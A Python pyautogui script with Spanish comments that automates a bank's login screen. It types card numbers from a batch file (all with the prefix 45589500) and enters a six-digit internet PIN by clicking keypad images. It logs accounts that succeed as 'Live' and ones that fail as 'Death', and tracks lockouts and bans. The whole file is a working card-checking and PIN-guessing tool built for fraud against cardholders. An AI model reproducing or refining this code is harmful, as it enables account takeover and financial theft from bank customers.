import pyautogui 
import time
import datetime
#import pytesseract
from PIL import Image
from colorama import Fore, init

init()

#pytesseract.pytesseract.tesseract_cmd = r"D:\Tesseract-OCR\tesseract.exe"


linealote = 0
entendido = 189,460
ingresar = 188,351
enOtroMomento = 187,494

#lugar_clave = 349,552
#cancelar = 1502,994
#ok_error = 1641,614


def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)

def buscarnumero(numero):
	

	image = "./imagenes-Azul/"+str(numero) + '.png'
	loc = None
	#time.sleep(0.5)
	while loc is None:
		time.sleep(0.1) # para ver	
		loc = pyautogui.locateOnScreen(image,grayscale=True, confidence=0.95, region=(0,523,391,201))
		#print(loc)
		if loc == None:
			print("Probable error...")
			print(numero)
			time.sleep(3)

	pyautogui.moveTo(loc)
	pyautogui.click()
	
	#input("Enter para continuar")
	#pyautogui.click(288,666)
	
def borrar(i):
	for i in range (1,i):
		pyautogui.click(63,701)
		#time.sleep(0.1)
		
lives = open("lives.txt","a")
print("*************************************")
print("Escriba los datos: ")
num1 = input("Numero 1 : ")
num2 = input("Numero 2 : ")
num3 = input("Numero 3 : ")
num4 = input("Numero 4 : ")
num5 = input("Numero 5 : ")
num6 = input("Numero 6 : ")

print("***************")
print("Presione 'Enter' para continuar")
input()
print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.3)
print("2")
time.sleep(0.3)
print("1")
time.sleep(0.3)
print("\n")


with open ('./lote.txt') as texto:
	for x in texto:
		print("-------------------------------------------------------------")
		
		linealote += 1
		var = False	
		time.sleep(0.4)

		pyautogui.click(210,144) # tipo de tarjeta
		time.sleep(0.3)
		pyautogui.click(219,392) # visa clasica chip
		time.sleep(0.3)
		pyautogui.click(267,191) # donde escribir la tarjeta
		time.sleep(0.2)
		#borrar(9)	
		#time.sleep(0.2)
		pyautogui.typewrite(x, interval=0.02)

		time.sleep(0.3)
		#print("clave de internet")
		pyautogui.click(201,297) # click clave de internet
		#pyautogui.click(319,337)

		sex = None
		time.sleep(0.3)
		numtempo = "./imagenes-Azul/3.png" 
		while (sex is None): #Esperando que cargue los numeros
			error1 = pyautogui.locateOnScreen(numtempo, grayscale=True, confidence=0.95, region=(0,523,391,201)) # x , y , ancho , alto
			if error1!=None: 
				break

		#print("Numeros!!")
		#calando del 1 al 6
		#print("45589500",x.rstrip())
		#print("Intentando 123456 ")

		#for j in range (1,7):
		#	buscarnumero(j)
			#time.sleep(1)
			#print(j)
		buscarnumero(num1)
		buscarnumero(num2)
		buscarnumero(num3)
		buscarnumero(num4)
		buscarnumero(num5)
		buscarnumero(num6)

		time.sleep(0.3)
		click(ingresar)

		registro = open("registro.txt","w")
		registro.write(str(x)) # escribir en el block
		registro.write("\n")
		registro.close()

		
		#print("Verificando...")
		time.sleep(0.6)

		#Confirmacion :
		#Lives
		c = None
		d = None
		e = None
		f = None
		b = None
		p = None
		q = None # ta
		r = None #ta
		u = None #ta
		w = None #ta

		contadorerror = 0
		contador = 0
		fechaActual = datetime.datetime.now()
		#flag = "flag1"
		while True: # Un " Y " poqe si no cumple 1 se rompe el bucle
			
			#contador += 1

			UsuarioNoAfiliado = "./imagenes-Azul/UsuarioNoAfiliado.png"
			b = pyautogui.locateOnScreen(UsuarioNoAfiliado, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("B",b)
			if b!=None:
				print("Usuario No Afiliado")
				pyautogui.click(enOtroMomento)
				break

			noExisInact = "./imagenes-Azul/noExisInact.png"
			r = pyautogui.locateOnScreen(noExisInact, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("r",r)
			if r!=None:
				pyautogui.click(entendido)
				print("Usuario no existe o se encuentra inactivo")
				break

			nodispo = "./imagenes-Azul/SerivicioNodispo.png"
			c = pyautogui.locateOnScreen(nodispo, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("c",c)
			if c!=None:
				print("Servicio no disponible")
				#pyautogui.click(277,615)
				print("Baneado pe creo.")
				input()
				break

			generarclave = "./imagenes-Azul/generarClave.png"
			w = pyautogui.locateOnScreen(generarclave, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("c",c)
			if w!=None:
				print("Usuario debe generar clave de 6 digitos")
				pyautogui.click(enOtroMomento)
				break

			IntentosExcedidos = "./imagenes-Azul/IntentosExcedidos.png"
			q = pyautogui.locateOnScreen(IntentosExcedidos, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("c",c)
			if q!=None:
				print("Usuario inactivo por intentos exceditos")
				pyautogui.click(entendido)
				break

			Sesioninvalida = "./imagenes-Azul/Sesioninvalida.png"
			u = pyautogui.locateOnScreen(Sesioninvalida, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("c",c)
			if u!=None:
				print("Sesion invalida")
				pyautogui.click(entendido)
				break

			#noAfi = "./imagenes-Azul/UsuarioNoAfiliado.png"
			#d = pyautogui.locateOnScreen(noAfi, grayscale=True, confidence=0.9, region=(0,0,570,1036))
			#print("d",d)
			#if d!=None:
			#	break
			#click(d)

			# ------------------------------------------------------------------------------------------
			imLive = "./imagenes-Azul/live.png"
			f = pyautogui.locateOnScreen(imLive, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("c",c)
			if f!=None:
				print("YA HAS ACTIVADO TU TOKEM DIGITAL !!")
				#click(277,615)
				break

			live2 = "./imagenes-Azul/live2.png"
			d = pyautogui.locateOnScreen(live2, grayscale=True, confidence=0.95, region=(79,275,240,242))
			#print("c",c)
			if d!=None:
				print("AUN NO CUENTAS CON TU TOKEM !!")
				#click(277,615)
				break

			if contadorerror > 5: # Por si no encuyentra ninguno
				error1 = "./imagenes-Azul/error1.png"
				c = pyautogui.locateOnScreen(error1, grayscale=True, confidence=0.95, region=(79,275,240,242))
				#print("c",c)
				if c!=None:
					print("Error... entendido !!")
					pyautogui.click(entendido)
					break

				error2 = "./imagenes-Azul/error2.png"
				w = pyautogui.locateOnScreen(error2, grayscale=True, confidence=0.95, region=(79,275,240,242))
				#print("c",c)
				if w!=None:
					print("Error... en otro momento !!")
					pyautogui.click(enOtroMomento)
					break
			
			#print("C",c)
			#if (b == None) or (c == None) or (d == None) or (e == None):
			#	time.sleep(0.2)
				#print("Espere...")
				#print(b)
				#time.sleep(5)
			if contadorerror > 20: # Por si no encuyentra ninguno
				print("-Ocurrió un error, actualice foto y enter....")	
				input()
				
			contadorerror += 1

		if (r!=None) or (c!=None) or (b!=None) or (u!=None): # MORIDAS!!!
			print(Fore.RED + "")
			fechaActual2 = datetime.datetime.strftime(fechaActual, '%H:%M:%S')
			print(fechaActual2 , " | " , 'N. ' , linealote , ": " , "45589500" , x.rstrip()+" -------------> Death")
			print(Fore.WHITE +"")
			#Clickeando en reincio (esa equis del lado)
			#time.sleep(1)
			#print("Equis")
			

		if (f!=None) or (d!=None): # Por si es LIVE:
			print ('\a')
			fechaActual2 = datetime.datetime.strftime(fechaActual,'%H:%M:%S')
			print(Fore.GREEN +"")
			print(fechaActual2, " | ","N. ", linealote ,": "," 45589500",x.rstrip()+" -------------> Live" , " | " + num1+num2+num3+num4+num5+num6)
			print(Fore.WHITE +"")
			lives = open("lives.txt","a")
			lives.write("45589500" + x.rstrip()) #escribir en el block
			lives.write(num1+num2+num3+num4+num5+num6)
			lives.write("+++++++++++++++++++++++++")
			lives.write("\n")
			lives.close()
			time.sleep(0.5)
			pyautogui.click(408,690)
			time.sleep(0.5)
			pyautogui.click(328,75)
			time.sleep(0.5)
			pyautogui.click(52,373)
			print("Espere...")
			time.sleep(8)
		

lives.close()
print("Programa finalizado")
print("se quedo en la linea: ", linealote)
print("*****************")
print("Presione 'Enter' para Finalizar")
input()



